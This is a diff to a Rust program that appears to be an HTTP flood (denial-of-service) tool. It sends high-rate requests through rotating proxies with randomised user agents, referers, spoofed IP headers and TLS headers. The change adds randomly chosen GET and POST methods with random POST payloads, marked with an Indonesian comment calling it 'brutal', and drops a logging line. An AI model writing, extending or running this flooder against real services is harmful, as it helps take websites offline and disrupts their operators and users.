@@ -1,7 +1,7 @@
 mod lib;
-use lib::{ConfigLists, pick_random, random_ip};
+use lib::{ConfigLists, pick_random, random_ip, random_payload};
 use std::{env, sync::Arc, time::{Duration, Instant}};
-use reqwest::{Client, Proxy, header::HeaderMap};
+use reqwest::{Client, Proxy, header::HeaderMap, Method};
 use tokio::sync::Semaphore;
 use futures::stream::{FuturesUnordered, StreamExt};
 
@@ -19,8 +19,7 @@ async fn main() {
     let duration_sec = 30;
 
     // Load semua config eksternal
-    let mut config = ConfigLists::load();
-    config.proxies = Arc::new(lib::load_file(proxyfile)); // override dengan file argumen jika berbeda
+    let config = ConfigLists::load(proxyfile);
 
     println!("Target: {target}\nRPS: {rps}, Threads: {threads}, Duration: {duration_sec}s");
     println!("Proxies: {}, Useragents: {}, Referers: {}, Paths: {}",
@@ -105,12 +104,20 @@ async fn main() {
                     headers.insert("TLS-Cipher", cipher.parse().unwrap());
                     headers.insert("TLS-SigAlg", sigalg.parse().unwrap());
 
-                    let req = client
-                        .get(&url)
+                    // Brutal: GET/POST random, POST punya payload random
+                    let method = if rng.gen_bool(0.5) { Method::GET } else { Method::POST };
+                    let mut req = client.request(method.clone(), &url)
                         .headers(headers)
                         .timeout(Duration::from_secs(4));
+
+                    if method == Method::POST {
+                        let payload = random_payload();
+                        req = req.body(payload);
+                    }
+
                     batch.push(req.send());
                 }
+                // Tunggu semua batch selesai
                 let mut ok = 0;
                 let mut fail = 0;
                 while let Some(res) = batch.next().await {
@@ -119,8 +126,6 @@ async fn main() {
                         Err(_) => fail += 1,
                     }
                 }
-                // Optional: log per batch (bisa dihapus jika tidak mau noisy)
-                // println!("Batch done: OK: {}, Fail: {}", ok, fail);
             }
         }));
     }
